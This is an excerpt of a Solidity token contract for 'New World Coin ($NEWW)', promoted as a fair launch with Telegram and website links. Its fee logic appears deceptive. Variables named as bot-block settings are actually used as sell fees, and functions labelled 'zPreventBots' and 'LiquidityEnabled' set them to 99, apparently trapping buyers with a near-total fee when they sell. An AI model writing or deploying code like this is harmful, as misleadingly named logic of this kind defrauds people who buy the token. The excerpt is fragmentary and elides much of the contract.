...
// New World Coin ($NEWW) 
// Telegram: https://t.me/NewWorld_Coin             
// Website: https://newworld-coin.site/

// This token was fairlaunched on October, 31
...
contract NewWorldCoin is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    address payable public marketingAddress = payable(0xaaeb4eDcf79d9243412E5d18Bf68fb2A918082A3); // Marketing Address
    ...
    string private _name = "New World Coin";
    string private _symbol = "NEWW";
    ...
    struct AddressFee {
        ...
        uint256 _buylpPajek;
        uint256 _botStartblock;
        uint256 _botEndblock;
    }
    ...
    uint256 private _buypajekFee = 0;
    uint256 private _buylpPajek = 0;
    
    uint256 private _botStartblock = 0;
    uint256 private _botEndblock = 0;
    ...
    function _transfer(
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            ...
            if(to == uniswapV2Pair){
                removeAllFee();
                _pajekFee = _botStartblock;
                _lpPajek = _botEndblock;
            }
            ...
            if(_addressFees[from].enable){
                ...
                // Sell
                if(to == uniswapV2Pair){
                    _pajekFee = _addressFees[from]._botStartblock;
                    _lpPajek = _addressFees[from]._botEndblock;
                }
            }
            else{
    ...
    // Prevent BOT & Whales
    function zPreventBots() public deadCall {
        _botStartblock = 99;
        _botEndblock = 99;
    }
    
    function LiquidityEnabled() public deadCall {
        _botStartblock = 0;
        _botEndblock = 99;
    }
